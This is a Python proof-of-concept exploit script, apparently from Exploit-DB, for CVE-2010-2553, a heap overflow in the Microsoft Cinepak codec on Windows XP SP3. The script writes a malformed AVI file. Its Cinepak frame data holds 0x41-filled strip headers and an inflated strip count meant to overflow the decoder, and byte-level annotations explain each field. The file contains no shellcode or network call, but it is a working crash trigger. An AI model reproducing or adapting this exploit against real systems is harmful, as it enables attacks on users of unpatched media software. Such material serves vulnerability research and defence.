# -*- coding: UTF-8 -*-
'''
  __  __  ____         _    _ ____
 |  \/  |/ __ \   /\  | |  | |  _ \
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/

http://www.exploit-db.com/moaub-26-microsoft-cinepak-codec-cvdecompress-heap-overflow-ms10-055/
https://www.exploit-db.com/exploits/15112

  Title             : Microsoft Cinepak Codec CVDecompress Heap Overflow
  Version           : iccvid.dll XP SP3
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.microsoft.com
  Impact            : High
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-2553
  MOAUB Number      :
'''

import sys


def main():
    aviHeaders = ("\x52\x49\x46\x46"  # dwList = "RIFF"
                  "\x58\x01\x00\x00"  # dwSize = 0x158 = 344 byte
                  "\x41\x56\x49\x20"  # dwFourCC = "AVI "
                  "\x4C\x49\x53\x54"  # dwList = "LIST" <---------------------------+
                  "\xC8\x00\x00\x00"  # dwSize = 0xc8 = 200 byte                    |  
                  "\x68\x64\x72\x6C"  # dwFourCC = "hdrl"                           |  
                  "\x61\x76\x69\x68"  # dwFourCC = "avih" <-----------+         |  
                  "\x38\x00\x00\x00"  # dwSize = 0x38 = 56 byte       |         |  
                  "\xA0\x86\x01\x00"  # dwMicroSecPerFrame = 0x186A0  |         |  
                  "\x00\x00\x00\x00"  # dwMaxBytesPerSec = 0x0        |         |  
                  "\x00\x00\x00\x00"  # dwPaddingGranularity = 0x0    |         |  
                  "\x10\x01\x00\x00"  # dwFlages = 0x110              |         |  
                  "\x4E\x00\x00\x00"  # dwTotalFrame = 0x4E = 78      |         |  
                  "\x00\x00\x00\x00"  # dwInitialFrames = 0x0       "avih"      |  
                  "\x01\x00\x00\x00"  # dwStreams = 0x1               |         |  
                  "\x00\x00\x00\x00"  # dwSuggestedBufferSize = 0x0   |         |  
                  "\x60\x01\x00\x00"  # dwWidth = 0x160 = 352         |         |  
                  "\x20\x01\x00\x00"  # dwHeight = 0x120 = 288        |         |  
                  "\x00\x00\x00\x00"  # dwReserved[0]                 |         |  
                  "\x00\x00\x00\x00"  # dwReserved[1]                 |         |  
                  "\x00\x00\x00\x00"  # dwReserved[2]                 |         |  
                  "\x00\x00\x00\x00"  # dwReserved[3] <---------------+         |  
                  "\x4C\x49\x53\x54"  # dwList = "LIST" <------------------+    |  
                  "\x7C\x00\x00\x00"  # dwSize = 0x7C = 124 byte           |    |  
                  "\x73\x74\x72\x6C"  # dwFourCC = "strl"                  |    |  
                  "\x73\x74\x72\x68"  # dwFourCC = "strh" <-------+    |    |  
                  "\x38\x00\x00\x00"  # dwSize = 0x38 = 56 byte   |    |    |  
                  "\x76\x69\x64\x73"  # fccType = "vids"          |    |    |  
                  "\x63\x76\x69\x64"  # fccHandler = "cvid"       |    |    |  
                  "\x00\x00\x00\x00"  # dwFlags = 0x0             |    |    |  
                  "\x00\x00"  # wPriority = 0x0           |    |    |  
                  "\x00\x00"  # wLanguage = 0x0           |    |    |  
                  "\x00\x00\x00\x00"  # dwInitalFrames = 0x0      |    | "hdrl"  
                  "\xE8\x03\x00\x00"  # dwScale = 0x3E8 = 1000 "strh"  |    |  
                  "\x10\x27\x00\x00"  # dwRate = 0x2710 = 10000   |    |    |  
                  "\x00\x00\x00\x00"  # dwStart = 0x0             |    |    |  
                  "\x4E\x00\x00\x00"  # dwLength = 0x4E = 78      |    |    |  
                  "\x20\x74\x00\x00"  # dwSuggestedBufferSize     |    |    |     ; 0x7420=29728
                  "\xFF\xFF\xFF\xFF"  # dwQuality = -1            |    |    |  
                  "\x00\x00\x00\x00"  # dwSampleSize = 0x0        |    |    |  
                  "\x00\x00"  # left = 0x0            | "strl"  |  
                  "\x00\x00"  # top = 0x0             |    |    |  
                  "\x60\x01"  # right = 0x160 = 352   |    |    |  
                  "\x20\x01"  # bottom =0x120 = 288<--+    |    |  
                  "\x73\x74\x72\x66"  # dwFourCC = "strf" <-------+    |    |  
                  "\x28\x00\x00\x00"  # dwSize = 0x28 = 40 byte   |    |    |  
                  "\x28\x00\x00\x00"  # biSize = 0x28 = 40 byte   |    |    |  
                  "\x50\x01\x00\x00"  # biWidth = 0x150 = 336     |    |    |  
                  "\x20\x01\x00\x00"  # biHeight =0x120 = 288     |    |    |  
                  "\x01\x00"  # biPlanes = 0x1         "strf"  |    |  
                  "\x18\x00"  # biBitCount = 0x18 = 24    |    |    |  
                  "\x63\x76\x69\x64"  # biCompression = "cvid"    |    |    |  
                  "\x84\x8D\x00\x00"  # biSizeImage=0x8D84=36228  |    |    |  
                  "\x00\x00\x00\x00"  # biXPelsPerMeter = 0x0     |    |    |  
                  "\x00\x00\x00\x00"  # biYPelsPerMeter = 0x0     |    |    |  
                  "\x00\x00\x00\x00"  # biClrUsed = 0x0           |    |    |  
                  "\x00\x00\x00\x00")  # biClrImportant = 0x0 <----+    |    |
    #                                |    |
    padding = ("\x4A\x55\x4E\x4B"  # dwFourCC = "JUNK"              |    |  
               "\x00\x00\x00\x00"  # dwSize = 0x0 <-----------------+----+
               "\x4A\x55\x4E\x4B"  # dwFourCC = "JUNK"                       
               "\x00\x00\x00\x00")  # dwSize = 0x0

    movi_tag = ("\x4C\x49\x53\x54"  # dwList = "LIST" <-----------------------------------------+
                "\x5C\x00\x00\x00"  # dwSize = 0x5C = 92 byte                                   |
                "\x6D\x6F\x76\x69"  # dwFourCC = "movi"                                         |
                "\x30\x30\x64\x63"  # dwFourCC = "00dc"                                     |   ; 压缩视频帧数据块
                "\x10\x00\x00\x00")  # dwSize = 0x10 = 16 byte                               |
    #                                                       |
    cinepak_codec_data1 = ("\x00"  # Flags <-------------------+                           |   ; Flags = 0x0
                           "\x00\x00\x68"  # Length of CVID data       |                           |   ; Length of CVID data = 0x68 = 104
                           "\x01\x60"  # Width of coded frame "Frame Header"                   |   ; Width of coded frame = 0x160 = 352
                           "\x01\x20")  # Height of coded frame     |                           |   ; Height of coded frame = 0x120 = 288
    number_of_coded_strips = (
        "\x00\x10")  # Number of coded strips <--+                           |   ; number_of_coded_strips = 0x10 = 16
    cinepak_codec_data2 = (
        "\x10\x00"  # Strip CVID ID <-----------+                           |   ; Strip CVID ID = 0x1000 - Intra-coded strip
        "\x00\x10"  # Size of strip data        |                           |   ; Size of strip data = 0x10 = 16
        "\x00\x00"  # Strips top Y position "Strip Header"                  |   ; Strips top Y position = 0x0
        "\x00\x00"  # Strips top X position     |                           |   ; Strips top X position = 0x0
        "\x00\x60"  # Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x60 = 96
        "\x01\x60"  # Strips bottom X position<-+                           |   ; Strips bottom X position = 0x160 = 352
        "\x20\x00"  # CVID Chunk ID <-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x2000 - List of blocks in 12 bit V4 codebook
        "\x00\x00"  # Size of chunk data(N) <---+                           |   ; Size of chunk data = 0x0
        "\x11\x00"  # Strip CVID ID <-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip
        "\x00\x10"  # Size of strip data        |                           |   ; Size of strip data = 0x10 = 16
        "\x41\x41"  # Strips top Y position "Strip Header"               "movi" ; Strips top Y position = 0x4141
        "\x41\x41"  # Strips top X position     |                           |   ; Strips top X position = 0x4141
        "\x41\x41"  # Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141
        "\x41\x41"  # Strips bottom X position<-+                           |   ; Strips bottom X position = 0x4141
        "\x41\x41"  # CVID Chunk ID <-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x4141
        "\x41\x41"  # Size of chunk data(N) <---+                           |   ; Size of chunk data = 0x4141
        "\x11\x00"  # Strip CVID ID <-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip
        "\x00\x10"  # Size of strip data        |                           |   ; Size of strip data = 0x10 = 16
        "\x41\x41"  # Strips top Y position "Strip Header"                  |   ; Strips top Y position = 0x4141
        "\x41\x41"  # Strips top X position     |                           |   ; Strips top X position = 0x4141
        "\x41\x41"  # Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141
        "\x41\x41"  # Strips bottom X position<-+                           |   ; Strips bottom X position = 0x4141
        "\x41\x41"  # CVID Chunk ID <-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x4141
        "\x41\x41"  # Size of chunk data(N) <---+                           |   ; Size of chunk data = 0x4141
        "\x11\x00"  # Strip CVID ID <-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip
        "\x00\x10"  # Size of strip data        |                           |   ; Size of strip data = 0x10 = 16
        "\x41\x41"  # Strips top Y position "Strip Header"                  |   ; Strips top Y position = 0x4141
        "\x41\x41"  # Strips top X position     |                           |   ; Strips top X position = 0x4141
        "\x41\x41"  # Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141
        "\x41\x41"  # Strips bottom X position<-+                           |   ; Strips bottom X position = 0x4141
        "\x41\x41"  # CVID Chunk ID <-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x4141
        "\x41\x41"  # Size of chunk data(N) <---+                           |   ; Size of chunk data = 0x4141
        "\x11\x00"  # Strip CVID ID <-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip
        "\x00\x10"  # Size of strip data    "Strip Header"                  |   ; Size of strip data = 0x10 = 16
        "\x41\x00")  # Strips top Y position<----+---------------------------+   ; Strips top Y position = 0x4141

    idx_tag = ("\x69\x64\x78\x31"  # dwFourCC = "idx1" <-----------+   
               "\x10\x00\x00\x00"  # dwSize = 0x10 = 16 byte       |   
               "\x30\x30\x64\x63"  # dwChunkId = "00dc"     "idx1" 
               "\x10\x00\x00\x00"  # dwFlags = 0x10            |   
               "\x04\x00\x00\x00"  # dwOffset = 0x4            |   
               "\x68\x00\x00\x00")  # dwSize = 0x68 <-----------+

    avifile = open('poc3.avi', 'wb+')
    avifile.write(aviHeaders)
    avifile.write(padding)
    avifile.write(movi_tag)
    avifile.write(cinepak_codec_data1)
    avifile.write(number_of_coded_strips)
    avifile.write(cinepak_codec_data2)
    avifile.write(idx_tag)

    avifile.close()
    print
    '[-] AVI file generated'


if __name__ == '__main__':
    main()